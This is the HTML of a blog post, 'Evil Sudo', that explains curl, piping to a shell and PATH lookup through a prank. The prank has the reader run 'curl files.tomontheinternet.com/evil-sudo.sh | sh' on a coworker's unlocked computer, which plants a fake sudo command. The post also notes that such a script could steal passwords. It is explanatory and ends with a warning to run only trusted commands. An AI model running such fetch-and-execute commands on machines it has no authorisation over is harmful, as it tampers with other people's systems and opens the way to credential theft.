@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en-ca">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <script type="text/javascript" src="https://latest.cactus.chat/cactus.js"></script>
+  <link rel="stylesheet" href="https://latest.cactus.chat/style.css" type="text/css">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Evil Sudo | Tom on the Internet Weblog</title>
+  <link rel = 'canonical' href = 'https://blog.tomontheinternet.com/posts/evil-sudo/'>
+  <meta name="description" content="My name is Tom. This is my blog.
+
+If you read anything you like here, please [let me know](mailto:tom@tomontheinternet.com).
+
+You can learn more about me [on my website](https://tomontheinternet.com).">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Evil Sudo" />
+<meta property="og:description" content="This article assumes basic knowledge of the command-line. It also assumes you are on Linux or Mac.
+There is also a video to accompany this blog post if you prefer. youtube: RrgxRXZf0vI
+Want to infuriate a coworker?  Wait until they leave their computer unlocked. Open a terminal and run this command:  curl files.tomontheinternet.com/evil-sudo.sh | sh Close the terminal.  Now, whenever they try to use sudo, they&rsquo;ll see this:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.tomontheinternet.com/posts/evil-sudo/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-10-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-10-18T00:00:00+00:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Evil Sudo"/>
+<meta name="twitter:description" content="This article assumes basic knowledge of the command-line. It also assumes you are on Linux or Mac.
+There is also a video to accompany this blog post if you prefer. youtube: RrgxRXZf0vI
+Want to infuriate a coworker?  Wait until they leave their computer unlocked. Open a terminal and run this command:  curl files.tomontheinternet.com/evil-sudo.sh | sh Close the terminal.  Now, whenever they try to use sudo, they&rsquo;ll see this:"/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://blog.tomontheinternet.com/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css" integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N&#43;XoIuZg=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://blog.tomontheinternet.com/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://blog.tomontheinternet.com/posts/why-i-use-linux/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://blog.tomontheinternet.com/posts/moving-to-aws/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&text=Evil%20Sudo" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&title=Evil%20Sudo" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&is_video=false&description=Evil%20Sudo" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Evil%20Sudo&body=Check out this article: https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&title=Evil%20Sudo" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&title=Evil%20Sudo" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&name=Evil%20Sudo&description=This%20article%20assumes%20basic%20knowledge%20of%20the%20command-line.%20It%20also%20assumes%20you%20are%20on%20Linux%20or%20Mac.%0aThere%20is%20also%20a%20video%20to%20accompany%20this%20blog%20post%20if%20you%20prefer.%20youtube%3a%20RrgxRXZf0vI%0aWant%20to%20infuriate%20a%20coworker%3f%20%20Wait%20until%20they%20leave%20their%20computer%20unlocked.%20Open%20a%20terminal%20and%20run%20this%20command%3a%20%20curl%20files.tomontheinternet.com%2fevil-sudo.sh%20%7c%20sh%20Close%20the%20terminal.%20%20Now%2c%20whenever%20they%20try%20to%20use%20sudo%2c%20they%26rsquo%3bll%20see%20this%3a" aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&t=Evil%20Sudo" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        Evil Sudo
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2019-10-18 00:00:00 &#43;0000 UTC" itemprop="datePublished">2019-10-18</time>
+          
+        </div>
+        
+        
+        
+        
+      </div>
+    </header>
+
+  
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#want-to-infuriate-a-coworker">Want to infuriate a coworker?</a></li>
+    <li><a href="#how-does-this-work">How does this work?</a></li>
+    <li><a href="#whats-curl">What&rsquo;s curl?</a></li>
+    <li><a href="#sending-text-to-a-shell">Sending text to a shell.</a></li>
+    <li><a href="#what-does-evil-sudosh-do">What does <code>evil-sudo.sh</code> do?</a></li>
+    <li><a href="#this-could-be-much-worse">This could be much worse</a></li>
+    <li><a href="#learn-more">Learn more</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    <div class="content" itemprop="articleBody">
+      <p>This article assumes basic knowledge of the command-line. It also assumes you are on Linux or Mac.</p>
+<p>There is also a video to accompany this blog post if you prefer.
+<code>youtube: RrgxRXZf0vI</code></p>
+<h2 id="want-to-infuriate-a-coworker">Want to infuriate a coworker?</h2>
+<ol>
+<li>Wait until they leave their computer unlocked.</li>
+<li>Open a terminal and run this command:</li>
+</ol>
+<pre tabindex="0"><code>curl files.tomontheinternet.com/evil-sudo.sh | sh
+</code></pre><ol start="3">
+<li>Close the terminal.</li>
+</ol>
+<p>Now, whenever they try to use sudo, they&rsquo;ll see this:</p>
+<pre tabindex="0"><code>10d20d7815 EXCEPTION unknown (0313)
+</code></pre><p>Googling won&rsquo;t help them, because that error is utter nonsense.</p>
+<h2 id="how-does-this-work">How does this work?</h2>
+<p>To understand what&rsquo;s happening, you need to understand the following things:</p>
+<ol>
+<li>What <code>curl</code> is.</li>
+<li>How you can pipe text to a shell.</li>
+<li>What <code>evil-sudo.sh</code> does, and how the shell (command-line) determines which programs to run.</li>
+</ol>
+<h2 id="whats-curl">What&rsquo;s curl?</h2>
+<p>Curl takes a URL, makes an HTTP request, and returns the response right in the terminal. Curl can do a lot more than that, but for us, this is enough.</p>
+<p>Type <code>curl https://www.google.com</code> into your terminal. You should now see a wall of text. That text is the HTML of Google&rsquo;s landing page.</p>
+<p>Now type <code>curl files.tomontheinternet.com/evil-sudo.sh</code>. I <em>promise</em> nothing bad will happen. What you see now is a shell script I wrote and hosted online. Curl went out and got it for you.</p>
+<h2 id="sending-text-to-a-shell">Sending text to a shell.</h2>
+<p>The pipe command looks like a pipe: <code>|</code>. It takes the output of one command and sends it to another command.</p>
+<p>Type <code>sh</code> into your terminal. You are now in an <code>sh</code> shell. It&rsquo;s a lot like a Bash or Z shell. You can play around in this shell if you want. Then type <code>exit</code> to get back to your normal shell.</p>
+<p>Type <code>echo &quot;echo hi&quot; | sh</code> into your terminal. This will send the text &ldquo;echo hi&rdquo; to the <code>sh</code> shell to be run. <code>sh</code> will run the command return the value, which is &ldquo;hi&rdquo;.</p>
+<p>So, looking at the command from the start of this blog post, can you see what <code>curl files.tomontheinternet.com/evil-sudo.sh | sh</code> does?</p>
+<p>It takes the result of <code>curl files.tomontheinternet.com/evil-sudo.sh</code>, which is a shell script, and sends it to <code>sh</code>. <code>sh</code> then runs the shell script.</p>
+<p>So, running <code>curl files.tomontheinternet.com/evil-sudo.sh | sh</code> downloads a shell script called <code>evil-sudo.sh</code> and runs it on your computer as you.</p>
+<h2 id="what-does-evil-sudosh-do">What does <code>evil-sudo.sh</code> do?</h2>
+<p>Here&rsquo;s what <code>evil-sudo.sh</code> DOESN&rsquo;T do: it doesn&rsquo;t modify your <code>sudo</code> command. It can&rsquo;t do that, because it doesn&rsquo;t have root access.</p>
+<p>Unix-based systems have a <code>$PATH</code> variable. To see yours, type <code>echo $PATH</code>. This variable tells your shell where to find programs. Your shell looks, <em>in order</em>, through these directories to see if a program exists. When it finds a program, it runs it.</p>
+<p><code>evil-sudo.sh</code> adds a directory to your $PATH and then creates a fake sudo program in that directory. It does this by determining what shell you are using, and adding a line to your <code>rc</code> file. So far, it only supports <code>bash</code> and <code>zsh</code>, but that covers 95% of all users. Now, when you run the <code>sudo</code> command, your shell finds the fake sudo program <em>first</em> and uses the fake sudo instead of the real sudo.</p>
+<p>Don&rsquo;t worry though! <code>evil-sudo.sh</code> is harmless.</p>
+<h2 id="this-could-be-much-worse">This could be much worse</h2>
+<p><code>evil-sudo.sh</code> is annoying, but it could be much worse. It could pretend to be the real sudo command, and steal your password. Once it has your password, it could delete all files on your computer. Scary.</p>
+<p>Make sure you only run commands you trust!</p>
+<h2 id="learn-more">Learn more</h2>
+<p>The source code and a command to remove <code>evil-sudo.sh</code> are available <a href="https://github.com/tom-on-the-internet/evil-sudo">here</a>.</p>
+
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+      </ul>
+    </div>
+
+    
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f" aria-label="Facebook">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&text=Evil%20Sudo" aria-label="Twitter">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&title=Evil%20Sudo" aria-label="Linkedin">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&is_video=false&description=Evil%20Sudo" aria-label="Pinterest">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=Evil%20Sudo&body=Check out this article: https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f" aria-label="Email">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&title=Evil%20Sudo" aria-label="Pocket">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&title=Evil%20Sudo" aria-label="reddit">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&name=Evil%20Sudo&description=This%20article%20assumes%20basic%20knowledge%20of%20the%20command-line.%20It%20also%20assumes%20you%20are%20on%20Linux%20or%20Mac.%0aThere%20is%20also%20a%20video%20to%20accompany%20this%20blog%20post%20if%20you%20prefer.%20youtube%3a%20RrgxRXZf0vI%0aWant%20to%20infuriate%20a%20coworker%3f%20%20Wait%20until%20they%20leave%20their%20computer%20unlocked.%20Open%20a%20terminal%20and%20run%20this%20command%3a%20%20curl%20files.tomontheinternet.com%2fevil-sudo.sh%20%7c%20sh%20Close%20the%20terminal.%20%20Now%2c%20whenever%20they%20try%20to%20use%20sudo%2c%20they%26rsquo%3bll%20see%20this%3a" aria-label="Tumblr">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.tomontheinternet.com%2fposts%2fevil-sudo%2f&t=Evil%20Sudo" aria-label="Hacker News">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2021  Tom on the Internet Weblog 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
+<script src=/lib/jquery/jquery.min.js></script>
+<script src=/js/main.js></script>
+
+<script src=/js/code-copy.js></script>
+
+
+
+
+</html>
